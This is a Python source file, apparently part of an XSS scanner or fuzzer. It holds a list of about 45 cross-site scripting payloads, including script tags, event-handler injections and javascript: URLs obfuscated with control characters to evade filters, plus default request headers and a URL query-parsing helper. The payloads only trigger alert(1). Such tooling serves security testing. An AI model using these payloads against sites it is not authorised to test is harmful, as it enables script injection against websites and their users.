from urllib.parse import urlparse


fuzzes = (
    '<script type="text/javascript">alert(1);</script>',
    '<script\x20type="text/javascript">javascript:alert(1);</script>',
    '<script\x3Etype="text/javascript">javascript:alert(1);</script>',
    '<script\x0Dtype="text/javascript">javascript:alert(1);</script>',
    '<script\x09type="text/javascript">javascript:alert(1);</script>',
    '<script\x0Ctype="text/javascript">javascript:alert(1);</script>',
    '<script\x2Ftype="text/javascript">javascript:alert(1);</script>',
    '<script\x0Atype="text/javascript">javascript:alert(1);</script>',
    '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
    '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
    '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
    '<body src=1 href=1 onerror="javascript:alert(1)"></body>',
    '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
    '<object src=1 href=1 onerror="javascript:alert(1)"></object>',
    '<script src=1 href=1 onerror="javascript:alert(1)"></script>',
    '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>',
    '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
    '<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>',
    '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
    '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
    '<script>javascript:alert(1)</script\x0D',
    '<script>javascript:alert(1)</script\x0A',
    '<script>javascript:alert(1)</script\x0B',
    '<script charset="\x22>javascript:alert(1)</script>',
    '<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<script>/* *\x2A/javascript:alert(1)// */</script>',
    '<script>/* *\x00/javascript:alert(1)// */</script>',
    '<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>'
)

headers = {  # default headers
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1'
}

def converter(data):
    split_url = data.split('?')
    url = split_url[0]
    parts = split_url[1].split('&')
    dictized = {}
    for part in parts:
        params = part.split('=')
        dictized[params[0]] = params[1]
    return dictized, url
